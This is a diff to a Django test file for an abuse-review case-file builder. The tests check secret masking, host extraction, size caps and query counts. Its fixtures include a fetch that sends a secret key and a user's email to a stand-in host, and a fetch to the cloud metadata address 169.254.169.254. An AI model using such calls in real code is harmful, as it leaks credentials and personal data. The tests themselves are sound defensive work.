@@ -4,7 +4,9 @@ from typing import Any
 
 from unittest.mock import patch
 
+from django.db import connection
 from django.test import override_settings
+from django.test.utils import CaptureQueriesContext
 from django.utils import timezone
 
 import httpx
@@ -220,7 +222,11 @@ class TestAbuseReview(AbuseClassificationTestCase):
     def test_no_secret_value_reaches_the_case_file(self) -> None:
         legacy_secret = "legacy-mapping-token-0042"
         destination = self.create_destination(
-            encrypted_inputs={"api_key": {"value": SECRET_VALUE}},
+            # A secret input keeps its compiled bytecode, whose strings are ordinary names.
+            inputs={
+                "url": {"value": "https://hooks.example.com/orders"},
+                "api_key": {"value": SECRET_VALUE, "bytecode": ["_H", 1, 32, "properties"]},
+            },
             # Only top-level secrets move to the encrypted field, so an older mapping keeps its secret in plain text.
             mappings=[
                 {
@@ -234,7 +240,12 @@ class TestAbuseReview(AbuseClassificationTestCase):
         self.log(
             destination,
             "updated",
-            changes=[{"field": "hog", "after": f"fetch('https://x.example.com/?key={SECRET_VALUE}')"}],
+            changes=[
+                {
+                    "field": "hog",
+                    "after": f"fetch('https://x.example.com/?key={SECRET_VALUE.upper()}', {{'body': event.properties.email}})",
+                }
+            ],
         )
         # The activity log masks inputs but not the inputs schema, whose secret default holds the value.
         self.log(
@@ -273,9 +284,40 @@ class TestAbuseReview(AbuseClassificationTestCase):
 
         serialized = build_case_file(destination, score(destination)).to_json()
 
-        assert SECRET_VALUE not in serialized
+        assert SECRET_VALUE not in serialized.lower()
         assert legacy_secret not in serialized
+        assert "event.properties.email" in serialized
         assert "https://hooks.example.com/orders" in serialized
+
+    def test_a_long_config_with_ordinary_history_keeps_its_hosts(self) -> None:
+        padding = " ".join(f"w{index}" for index in range(12_000))
+        destination = self.create_destination(hog=f"fetch('http://169.254.169.254/latest');\n// {padding}")
+        for version in range(case_file.MAX_HISTORY_ENTRIES):
+            code = " ".join(f"v{version}x{index}" for index in range(600))
+            entry = self.log(destination, "updated", changes=[{"field": "hog", "after": code}])
+            ActivityLog.objects.filter(pk=entry.pk).update(created_at=timezone.now() + timedelta(seconds=version))
+
+        case = self.case_of(destination)
+
+        assert len(json.dumps(case, ensure_ascii=False, separators=(",", ":"))) <= case_file.MAX_CASE_FILE_CHARS
+        assert case["function"]["named_hosts"][0] == "169.254.169.254"
+        assert case["function"]["classification"]["request_hosts"][0] == "169.254.169.254"
+        assert case["history"][-1]["code"].startswith(f"v{case_file.MAX_HISTORY_ENTRIES - 1}x0")
+
+    def test_the_org_function_check_costs_no_query_per_function(self) -> None:
+        destination = self.create_destination()
+
+        def queries_with(other_functions: int) -> int:
+            existing = HogFunction.objects.filter(team=self.team).exclude(pk=destination.pk).count()
+            for index in range(other_functions - existing):
+                self.other_function(self.team, name=f"Function {index}", hog="fetch('http://localhost:8000')")
+            destination.refresh_from_db()
+            scored = score(destination)
+            with CaptureQueriesContext(connection) as captured:
+                build_case_file(destination, scored)
+            return len(captured.captured_queries)
+
+        assert queries_with(2) == queries_with(6)
 
     def test_history_and_the_org_function_check_are_capped_to_the_latest(self) -> None:
         destination = self.create_destination()
